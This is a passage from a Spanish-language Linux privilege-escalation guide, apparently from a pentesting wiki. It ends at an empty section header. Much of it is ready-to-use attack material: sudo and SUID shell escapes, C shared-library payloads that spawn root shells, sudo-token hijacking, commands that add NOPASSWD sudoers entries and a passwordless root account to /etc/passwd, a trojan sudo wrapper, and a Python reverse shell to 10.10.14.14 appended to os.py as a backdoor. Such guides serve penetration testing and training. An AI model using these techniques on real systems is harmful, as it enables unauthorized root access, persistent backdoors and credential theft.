## Abusos de PATH escribible

### $PATH

Si encuentras que puedes **escribir dentro de alguna carpeta del $PATH** podrías ser capaz de escalar privilegios **creando una puerta trasera dentro de la carpeta escribible** con el nombre de algún comando que va a ser ejecutado por un usuario diferente (idealmente root) y que **no se carga desde una carpeta que esté ubicada antes** de tu carpeta escribible en $PATH.

### SUDO y SUID

Podrías tener permiso para ejecutar algún comando usando sudo o podrían tener el bit suid. Verifícalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Algunos **comandos inesperados te permiten leer y/o escribir archivos o incluso ejecutar un comando.** Por ejemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuración de Sudo podría permitir a un usuario ejecutar algún comando con los privilegios de otro usuario sin conocer la contraseña.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`, ahora es trivial obtener un shell al agregar una clave ssh en el directorio raíz o al llamar a `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** mientras ejecuta algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este ejemplo, **basado en la máquina HTB Admirer**, era **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca de python arbitraria mientras se ejecuta el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**Saltar** para leer otros archivos o usar **symlinks**. Por ejemplo en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si se utiliza un **wildcard** (\*), es aún más fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binario SUID sin ruta de comando

Si se otorgan **permisos sudo** a un solo comando **sin especificar la ruta**: _hacker10 ALL= (root) less_ puedes explotarlo cambiando la variable PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica también se puede utilizar si un **suid** binario **ejecuta otro comando sin especificar la ruta a este (siempre verifica con** _**strings**_ **el contenido de un binario SUID extraño)**.

[Ejemplos de payloads para ejecutar.](payloads-to-execute.md)

### Binario SUID con ruta de comando

Si el **suid** binario **ejecuta otro comando especificando la ruta**, entonces, puedes intentar **exportar una función** llamada como el comando que el archivo suid está llamando.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_ tienes que intentar crear la función y exportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Entonces, cuando llamas al binario suid, esta función se ejecutará

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se utiliza para especificar una o más bibliotecas compartidas (.so files) que deben ser cargadas por el cargador antes que todas las demás, incluida la biblioteca estándar de C (`libc.so`). Este proceso se conoce como precarga de una biblioteca.

Sin embargo, para mantener la seguridad del sistema y prevenir que esta función sea explotada, particularmente con ejecutables **suid/sgid**, el sistema impone ciertas condiciones:

- El cargador ignora **LD_PRELOAD** para ejecutables donde el ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
- Para ejecutables con suid/sgid, solo se precargan bibliotecas en rutas estándar que también son suid/sgid.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la declaración **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** persista y sea reconocida incluso cuando se ejecutan comandos con `sudo`, lo que puede llevar a la ejecución de código arbitrario con privilegios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Guarda como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Luego **compílalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escalar privilegios** ejecutando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similar puede ser abusado si el atacante controla la variable de entorno **LD_LIBRARY_PATH** porque controla la ruta donde se buscarán las bibliotecas.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Al encontrar un binario con permisos **SUID** que parece inusual, es una buena práctica verificar si está cargando archivos **.so** correctamente. Esto se puede comprobar ejecutando el siguiente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, encontrar un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere un potencial de explotación.

Para explotar esto, uno procedería creando un archivo C, digamos _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando permisos de archivos y ejecutando un shell con privilegios elevados.

Compila el archivo C anterior en un archivo de objeto compartido (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, ejecutar el binario SUID afectado debería activar la explotación, permitiendo una posible compromisión del sistema.

## Secuestro de Objetos Compartidos
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta donde podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si obtienes un error como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
eso significa que la biblioteca que has generado necesita tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista curada de binarios de Unix que pueden ser explotados por un atacante para eludir restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo pero para casos donde solo puedes **inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de binarios de Unix que pueden ser abusadas para salir de shells restringidos, escalar o mantener privilegios elevados, transferir archivos, generar shells bind y reverse, y facilitar otras tareas de post-explotación.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Si puedes acceder a `sudo -l`, puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar si encuentra cómo explotar alguna regla de sudo.

### Reutilizando Tokens de Sudo

En casos donde tienes **acceso a sudo** pero no la contraseña, puedes escalar privilegios **esperando a que se ejecute un comando sudo y luego secuestrando el token de sesión**.

Requisitos para escalar privilegios:

- Ya tienes un shell como usuario "_sampleuser_"
- "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15 minutos** (por defecto, esa es la duración del token de sudo que nos permite usar `sudo` sin introducir ninguna contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` es 0
- `gdb` es accesible (puedes ser capaz de subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` y establecer `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- La **primera explotación** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token de sudo en tu sesión** (no obtendrás automáticamente un shell root, haz `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- El **segundo exploit** (`exploit_v2.sh`) creará un shell sh en _/tmp_ **propiedad de root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- La **tercera explotación** (`exploit_v3.sh`) **creará un archivo sudoers** que hace que **los tokens de sudo sean eternos y permite a todos los usuarios usar sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<NombreDeUsuario>

Si tienes **permisos de escritura** en la carpeta o en cualquiera de los archivos creados dentro de la carpeta, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un token de sudo para un usuario y PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios de sudo** sin necesidad de conocer la contraseña haciendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos **por defecto solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo podrías ser capaz de **obtener información interesante**, y si puedes **escribir** cualquier archivo podrás **escalar privilegios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes abusar de este permiso.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Otra forma de abusar de estos permisos:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Hay algunas alternativas al binario `sudo`, como `doas` para OpenBSD, recuerda verificar su configuración en `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si sabes que un **usuario generalmente se conecta a una máquina y usa `sudo`** para escalar privilegios y tienes una shell dentro de ese contexto de usuario, puedes **crear un nuevo ejecutable de sudo** que ejecutará tu código como root y luego el comando del usuario. Luego, **modifica el $PATH** del contexto del usuario (por ejemplo, añadiendo la nueva ruta en .bash_profile) para que cuando el usuario ejecute sudo, tu ejecutable de sudo se ejecute.

Ten en cuenta que si el usuario utiliza una shell diferente (no bash) necesitarás modificar otros archivos para añadir la nueva ruta. Por ejemplo, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O ejecutando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca Compartida

### ld.so

El archivo `/etc/ld.so.conf` indica **de dónde provienen los archivos de configuración cargados**. Típicamente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`

Eso significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **apuntan a otras carpetas** donde se van a **buscar** **bibliotecas**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará bibliotecas dentro de `/usr/local/lib`**.

Si por alguna razón **un usuario tiene permisos de escritura** en cualquiera de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta dentro del archivo de configuración en `/etc/ld.so.conf.d/*.conf`, puede ser capaz de escalar privilegios.\
Echa un vistazo a **cómo explotar esta mala configuración** en la siguiente página:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Al copiar la lib en `/var/tmp/flag15/`, será utilizada por el programa en este lugar como se especifica en la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Luego crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

Las capacidades de Linux proporcionan un **subconjunto de los privilegios de root disponibles a un proceso**. Esto efectivamente divide los **privilegios de root en unidades más pequeñas y distintivas**. Cada una de estas unidades puede ser otorgada de manera independiente a los procesos. De esta manera, el conjunto completo de privilegios se reduce, disminuyendo los riesgos de explotación.\
Lee la siguiente página para **aprender más sobre las capacidades y cómo abusar de ellas**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Permisos de directorio

En un directorio, el **bit de "ejecutar"** implica que el usuario afectado puede "**cd**" en la carpeta.\
El bit de **"lectura"** implica que el usuario puede **listar** los **archivos**, y el bit de **"escritura"** implica que el usuario puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las Listas de Control de Acceso (ACLs) representan la capa secundaria de permisos discrecionales, capaces de **anular los permisos tradicionales ugo/rwx**. Estos permisos mejoran el control sobre el acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios o parte del grupo. Este nivel de **granularidad asegura una gestión de acceso más precisa**. Se pueden encontrar más detalles [**aquí**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Otorgar** al usuario "kali" permisos de lectura y escritura sobre un archivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtener** archivos con ACLs específicas del sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Abrir sesiones de shell

En **versiones antiguas** puedes **secuestrar** algunas sesiones de **shell** de un usuario diferente (**root**).\
En **versiones más recientes** solo podrás **conectarte** a las sesiones de pantalla de **tu propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la sesión**.

### Secuestro de sesiones de pantalla

**Listar sesiones de pantalla**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Adjuntar a una sesión**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## secuestro de sesiones tmux

Este era un problema con **versiones antiguas de tmux**. No pude secuestrar una sesión de tmux (v2.1) creada por root como un usuario no privilegiado.

**Listar sesiones tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Adjuntar a una sesión**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Revisa **Valentine box from HTB** para un ejemplo.

## SSH

### Debian OpenSSL PRNG predecible - CVE-2008-0166

Todas las claves SSL y SSH generadas en sistemas basados en Debian (Ubuntu, Kubuntu, etc.) entre septiembre de 2006 y el 13 de mayo de 2008 pueden verse afectadas por este error.\
Este error se produce al crear una nueva clave ssh en esos sistemas operativos, ya que **solo se podían generar 32,768 variaciones**. Esto significa que todas las posibilidades pueden ser calculadas y **teniendo la clave pública ssh puedes buscar la clave privada correspondiente**. Puedes encontrar las posibilidades calculadas aquí: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valores de configuración interesantes de SSH

- **PasswordAuthentication:** Especifica si se permite la autenticación por contraseña. El valor predeterminado es `no`.
- **PubkeyAuthentication:** Especifica si se permite la autenticación por clave pública. El valor predeterminado es `yes`.
- **PermitEmptyPasswords**: Cuando se permite la autenticación por contraseña, especifica si el servidor permite el inicio de sesión en cuentas con cadenas de contraseña vacías. El valor predeterminado es `no`.

### PermitRootLogin

Especifica si el root puede iniciar sesión usando ssh, el valor predeterminado es `no`. Valores posibles:

- `yes`: el root puede iniciar sesión usando contraseña y clave privada
- `without-password` o `prohibit-password`: el root solo puede iniciar sesión con una clave privada
- `forced-commands-only`: el root puede iniciar sesión solo usando clave privada y si se especifican las opciones de comandos
- `no`: no

### AuthorizedKeysFile

Especifica archivos que contienen las claves públicas que se pueden usar para la autenticación de usuarios. Puede contener tokens como `%h`, que serán reemplazados por el directorio home. **Puedes indicar rutas absolutas** (comenzando en `/`) o **rutas relativas desde el home del usuario**. Por ejemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Esa configuración indicará que si intentas iniciar sesión con la **clave privada** del usuario "**testusername**", ssh comparará la clave pública de tu clave con las que se encuentran en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`.

### ForwardAgent/AllowAgentForwarding

El reenvío del agente SSH te permite **usar tus claves SSH locales en lugar de dejar claves** (¡sin frases de contraseña!) en tu servidor. Así, podrás **saltar** a través de ssh **a un host** y desde allí **saltar a otro** host **usando** la **clave** ubicada en tu **host inicial**.

Necesitas establecer esta opción en `$HOME/.ssh.config` así:
```
Host example.com
ForwardAgent yes
```
Nota que si `Host` es `*`, cada vez que el usuario salta a una máquina diferente, ese host podrá acceder a las claves (lo cual es un problema de seguridad).

El archivo `/etc/ssh_config` puede **sobrescribir** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío de ssh-agent con la palabra clave `AllowAgentForwarding` (el valor predeterminado es permitir).

Si encuentras que el Forward Agent está configurado en un entorno, lee la siguiente página ya que **puedes abusar de ello para escalar privilegios**:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Archivos Interesantes

### Archivos de Perfiles

El archivo `/etc/profile` y los archivos bajo `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia un nuevo shell**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos, puedes escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si se encuentra algún script de perfil extraño, debe revisarlo en busca de **detalles sensibles**.

### Archivos Passwd/Shadow

Dependiendo del sistema operativo, los archivos `/etc/passwd` y `/etc/shadow` pueden tener un nombre diferente o puede haber una copia de seguridad. Por lo tanto, se recomienda **encontrar todos ellos** y **verificar si puede leer** los archivos para ver **si hay hashes** dentro de los archivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
En algunas ocasiones puedes encontrar **password hashes** dentro del archivo `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Primero, genera una contraseña con uno de los siguientes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Luego agrega el usuario `hacker` y agrega la contraseña generada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ejemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Alternativamente, puedes usar las siguientes líneas para agregar un usuario ficticio sin contraseña.\
ADVERTENCIA: podrías degradar la seguridad actual de la máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: En plataformas BSD, `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`, además, `/etc/shadow` se renombra a `/etc/spwd.db`.

Deberías verificar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de servicio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por ejemplo, si la máquina está ejecutando un **servidor tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tu puerta trasera se ejecutará la próxima vez que se inicie tomcat.

### Verificar Carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última, pero inténtalo)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ubicaciones extrañas/Archivos en propiedad
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Archivos modificados en los últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Archivos de base de datos Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_historial, .sudo_as_admin_successful, perfil, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml archivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Archivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries en PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Archivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copias de seguridad**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Archivos conocidos que contienen contraseñas

Lee el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), busca **varios archivos posibles que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para hacerlo es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), que es una aplicación de código abierto utilizada para recuperar muchas contraseñas almacenadas en una computadora local para Windows, Linux y Mac.

### Registros

Si puedes leer registros, es posible que puedas encontrar **información interesante/confidencial dentro de ellos**. Cuanto más extraño sea el registro, más interesante será (probablemente).\
Además, algunos registros de **auditoría** **"mal"** configurados (¿con puerta trasera?) pueden permitirte **grabar contraseñas** dentro de los registros de auditoría como se explica en esta publicación: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **leer los registros, el grupo** [**adm**](interesting-groups-linux-pe/#adm-group) será realmente útil.

### Archivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Búsqueda de Credenciales Genéricas/Regex

También deberías buscar archivos que contengan la palabra "**password**" en su **nombre** o dentro del **contenido**, y también verificar IPs y correos electrónicos dentro de los logs, o expresiones regulares de hashes.\
No voy a listar aquí cómo hacer todo esto, pero si estás interesado, puedes revisar los últimos chequeos que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Archivos Escribibles

### Secuestro de bibliotecas de Python

Si sabes de **dónde** se va a ejecutar un script de python y **puedes escribir dentro** de esa carpeta o puedes **modificar bibliotecas de python**, puedes modificar la biblioteca OS y ponerle un backdoor (si puedes escribir donde se va a ejecutar el script de python, copia y pega la biblioteca os.py).

Para **poner un backdoor en la biblioteca**, simplemente agrega al final de la biblioteca os.py la siguiente línea (cambia IP y PUERTO):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Explotación de Logrotate

Una vulnerabilidad en `logrotate` permite a los usuarios con **permisos de escritura** en un archivo de registro o sus directorios padre potencialmente obtener privilegios elevados. Esto se debe a que `logrotate`, que a menudo se ejecuta como **root**, puede ser manipulado para ejecutar archivos arbitrarios, especialmente en directorios como _**/etc/bash_completion.d/**_. Es importante verificar los permisos no solo en _/var/log_ sino también en cualquier directorio donde se aplique la rotación de registros.

> [!NOTE]
> Esta vulnerabilidad afecta a `logrotate` versión `3.18.0` y anteriores.

Más información detallada sobre la vulnerabilidad se puede encontrar en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(registros de nginx),** así que cada vez que encuentres que puedes alterar registros, verifica quién está gestionando esos registros y comprueba si puedes escalar privilegios sustituyendo los registros por enlaces simbólicos.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

